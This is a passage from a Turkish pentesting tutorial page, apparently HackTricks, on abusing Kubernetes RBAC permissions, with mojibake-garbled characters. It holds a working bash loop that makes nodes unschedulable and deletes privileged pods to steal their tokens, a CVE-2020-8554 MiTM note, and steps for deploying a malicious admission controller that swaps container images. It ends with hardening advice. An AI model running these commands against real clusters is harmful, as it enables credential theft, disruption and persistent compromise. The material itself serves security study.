{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Yetkili bir Kubelet API ile konuÅŸarak [**RCE almak iÃ§in burada**](../pentesting-kubernetes-services/#kubelet-rce) yetkili bir Ã¶rneÄŸe sahipsiniz.

### PodlarÄ± silme + planlanamayan dÃ¼ÄŸÃ¼mler

PodlarÄ± **silebilen** (`pods` kaynaÄŸÄ± Ã¼zerinde **silme** fiili), podlarÄ± **boÅŸaltabilen** (`pods/eviction` kaynaÄŸÄ± Ã¼zerinde **oluÅŸturma** fiili) veya pod durumunu **deÄŸiÅŸtirebilen** (`pods/status`'a eriÅŸim) ve **diÄŸer dÃ¼ÄŸÃ¼mleri planlanamaz** hale getirebilen (`nodes/status`'a eriÅŸim) veya dÃ¼ÄŸÃ¼mleri **silebilen** (`nodes` kaynaÄŸÄ± Ã¼zerinde **silme** fiili) ve bir pod Ã¼zerinde kontrolÃ¼ olan prensipler, diÄŸer dÃ¼ÄŸÃ¼mlerden podlarÄ± **Ã§alabilir**, bÃ¶ylece podlar **etkilenmiÅŸ dÃ¼ÄŸÃ¼mde** Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r ve saldÄ±rgan bu podlardan **tokenleri Ã§alabilir**.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Hizmet durumu (CVE-2020-8554)

**`services/status`**'yi **deÄŸiÅŸtirebilen** yetkililer, **dÃ¼zeltilmemiÅŸ CVE-2020-8554**'Ã¼ istismar etmek ve kÃ¼me karÅŸÄ± **MiTM saldÄ±rÄ±larÄ± baÅŸlatmak** iÃ§in `status.loadBalancer.ingress.ip` alanÄ±nÄ± ayarlayabilirler. CVE-2020-8554 iÃ§in Ã§oÄŸu Ã¶nlem, YÃ¶nlendiriciIP hizmetlerini engeller (bkz. [**burasÄ±**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### DÃ¼ÄŸÃ¼mler ve Pod'larÄ±n durumu

**`nodes/status`** veya **`pods/status`** Ã¼zerinde **gÃ¼ncelleme** veya **yama** izinlerine sahip yetkililer, zamanlama kÄ±sÄ±tlamalarÄ±nÄ± etkilemek iÃ§in etiketleri deÄŸiÅŸtirebilirler.

## Dahili AyrÄ±calÄ±k YÃ¼kseltme Ã–nlemleri

Kubernetes, ayrÄ±calÄ±k yÃ¼kseltmeyi Ã¶nlemek iÃ§in [dahili bir mekanizmaya](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) sahiptir.

Bu sistem, **kullanÄ±cÄ±larÄ±n rolleri veya rol baÄŸlantÄ±larÄ±nÄ± deÄŸiÅŸtirerek ayrÄ±calÄ±klarÄ±nÄ± yÃ¼kseltememesini saÄŸlar**. Bu kuralÄ±n uygulanmasÄ± API dÃ¼zeyinde gerÃ§ekleÅŸir ve RBAC yetkilendiricisi etkin olmasa bile bir gÃ¼venlik saÄŸlar.

Kural, bir **kullanÄ±cÄ±nÄ±n bir rol oluÅŸturabilmesi veya gÃ¼ncelleyebilmesi iÃ§in rolÃ¼n iÃ§erdiÄŸi tÃ¼m izinlere sahip olmasÄ± gerektiÄŸini** belirtir. DahasÄ±, kullanÄ±cÄ±nÄ±n mevcut izinlerinin kapsamÄ±, oluÅŸturmayÄ± veya deÄŸiÅŸtirmeyi denediÄŸi rolÃ¼n kapsamÄ±yla uyumlu olmalÄ±dÄ±r: ClusterRoles iÃ§in kÃ¼me genelinde veya Roller iÃ§in aynÄ± ad alanÄ±na (veya kÃ¼me genelinde) sÄ±nÄ±rlÄ±.

{% hint style="warning" %}
Ã–nceki kurala bir istisna vardÄ±r. EÄŸer bir yetkili, **`roles`** veya **`clusterroles`** Ã¼zerinde **`escalate`** fiilini kullanÄ±yorsa, kendi izinleri olmasa bile rollerin ve kÃ¼me rollerinin ayrÄ±calÄ±klarÄ±nÄ± artÄ±rabilir.
{% endhint %}

### **RoleBindings/ClusterRoleBindings Al ve Yama**

{% hint style="danger" %}
**GÃ¶rÃ¼nÃ¼ÅŸe gÃ¶re bu teknik Ã¶nceden Ã§alÄ±ÅŸÄ±yordu, ancak testlerime gÃ¶re artÄ±k Ã§alÄ±ÅŸmÄ±yor, Ã§Ã¼nkÃ¼ Ã¶nceki bÃ¶lÃ¼mde aÃ§Ä±klandÄ±ÄŸÄ± gibi, zaten sahip olmadÄ±ÄŸÄ±nÄ±z bir yetkiyi kendinize veya farklÄ± bir SA'ya vermek iÃ§in bir rol baÄŸlantÄ±sÄ± oluÅŸturamazsÄ±nÄ±z/deÄŸiÅŸtiremezsiniz.**
{% endhint %}

Rolebindings oluÅŸturma yetkisi, bir kullanÄ±cÄ±nÄ±n **rolleri bir hizmet hesabÄ±na baÄŸlamasÄ±na** izin verir. Bu yetki, **kompromize edilmiÅŸ bir hizmet hesabÄ±na yÃ¶netici ayrÄ±calÄ±klarÄ±nÄ± baÄŸlama** potansiyeline sahip olduÄŸundan ayrÄ±calÄ±k yÃ¼kseltmeye yol aÃ§abilir.

## DiÄŸer SaldÄ±rÄ±lar

### Yan araÃ§ proxy uygulamasÄ±

VarsayÄ±lan olarak, podlar arasÄ±ndaki iletiÅŸimde herhangi bir ÅŸifreleme yoktur. Ä°ki yÃ¶nlÃ¼, poddan poda karÅŸÄ±lÄ±klÄ± kimlik doÄŸrulama.

#### Yan araÃ§ proxy uygulamasÄ± oluÅŸturma <a href="#yan-arac-proxy-uygulamasi-olusturma" id="yan-arac-proxy-uygulamasi-olusturma"></a>

.yaml dosyanÄ±zÄ± oluÅŸturun.

```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```

Yaml dosyanÄ±zÄ± dÃ¼zenleyin ve aÅŸaÄŸÄ±daki satÄ±rlarÄ± yorum iÅŸaretini kaldÄ±rarak ekleyin:

```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```

Proxy'nin gÃ¼nlÃ¼klerini gÃ¶rÃ¼ntÃ¼leyin:

```bash
kubectl logs app -C proxy
```

Daha fazla bilgi iÃ§in: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### ZararlÄ± Kabul Denetleyicisi

Bir kabul denetleyicisi, nesnenin kalÄ±cÄ±lÄ±ÄŸÄ±ndan Ã¶nce Kubernetes API sunucusuna yapÄ±lan istekleri **onaylar**. Ancak istek **kimlik doÄŸrulandÄ±ktan ve yetkilendirildikten sonra** gerÃ§ekleÅŸir.

Bir saldÄ±rgan, bir Mutasyon Kabul Denetleyicisi **enjekte etmeyi baÅŸarÄ±rsa**, zaten kimlik doÄŸrulanan istekleri **deÄŸiÅŸtirebilir**. Bu, potansiyel olarak ayrÄ±calÄ±k yÃ¼kseltme ve daha yaygÄ±n olarak kÃ¼mede kalÄ±cÄ±lÄ±k saÄŸlama yeteneÄŸi anlamÄ±na gelir.

**Ã–rnek:** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):

```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```

Durumunu kontrol etmek iÃ§in hazÄ±r olup olmadÄ±ÄŸÄ±nÄ± kontrol edin:

```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```

![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

ArdÄ±ndan yeni bir pod daÄŸÄ±tÄ±n:

```bash
kubectl run nginx --image nginx
kubectl get po -w
```

`ErrImagePull` hatasÄ±nÄ± gÃ¶rdÃ¼ÄŸÃ¼nÃ¼zde, gÃ¶rÃ¼ntÃ¼ adÄ±nÄ± aÅŸaÄŸÄ±daki sorgulardan biriyle kontrol edin:

```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```

![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

YukarÄ±daki resimde gÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, `nginx` gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ Ã§alÄ±ÅŸtÄ±rmayÄ± denedik, ancak sonunda Ã§alÄ±ÅŸtÄ±rÄ±lan gÃ¶rÃ¼ntÃ¼ `rewanthtammana/malicious-image` oldu. Ne oldu!?

#### Teknik Detaylar <a href="#heading-technicalities" id="heading-technicalities"></a>

`./deploy.sh` betiÄŸi, istekleri deÄŸiÅŸtiren bir webhook kabul denetleyicisi oluÅŸturur ve yapÄ±landÄ±rma satÄ±rlarÄ±nda belirtilen ÅŸekilde Kubernetes API'sine yapÄ±lan istekleri deÄŸiÅŸtirir, gÃ¶zlemlenen sonuÃ§larÄ± etkiler:

```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```

YukarÄ±daki kod parÃ§acÄ±ÄŸÄ±, her poddaki ilk konteyner gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ `rewanthtammana/malicious-image` ile deÄŸiÅŸtirir.

## En Ä°yi Uygulamalar

### **Servis HesabÄ± TokenlarÄ±nÄ±n Otomatik BaÄŸlanmasÄ±nÄ± Devre DÄ±ÅŸÄ± BÄ±rakma**

* **Podlar ve Servis HesaplarÄ±**: VarsayÄ±lan olarak, podlar bir servis hesabÄ± tokenunu baÄŸlar. GÃ¼venliÄŸi artÄ±rmak iÃ§in, Kubernetes bu otomatik baÄŸlama Ã¶zelliÄŸini devre dÄ±ÅŸÄ± bÄ±rakmayÄ± saÄŸlar.
* **NasÄ±l UygulanÄ±r**: Kubernetes sÃ¼rÃ¼mÃ¼ 1.6'dan baÅŸlayarak, servis hesaplarÄ± veya podlarÄ±n yapÄ±landÄ±rmasÄ±nda `automountServiceAccountToken: false` olarak ayarlayÄ±n.

### **RoleBindings/ClusterRoleBindings'de KÄ±sÄ±tlÄ± KullanÄ±cÄ± AtamasÄ±**

* **SeÃ§ici Dahil Etme**: RoleBindings veya ClusterRoleBindings iÃ§inde yalnÄ±zca gerekli kullanÄ±cÄ±larÄ±n bulunduÄŸundan emin olun. SÄ±k sÄ±k denetleyin ve ilgisiz kullanÄ±cÄ±larÄ± kaldÄ±rarak sÄ±kÄ± gÃ¼venliÄŸi koruyun.

### **Namespace-Specific Rollerin Cluster-Wide Rollerden Daha Ä°yi KullanÄ±lmasÄ±**

* **Roller vs. ClusterRoller**: Ä°zinlerin namespace'e Ã¶zgÃ¼ olmasÄ± iÃ§in ClusterRoles ve ClusterRoleBindings yerine Roller ve RoleBindings kullanmayÄ± tercih edin. Bu yaklaÅŸÄ±m daha ince kontrol saÄŸlar ve izinlerin kapsamÄ±nÄ± sÄ±nÄ±rlar.

### **Otomatik AraÃ§lar Kullanma**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Referanslar**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)'u takip edin.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github reposuna PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
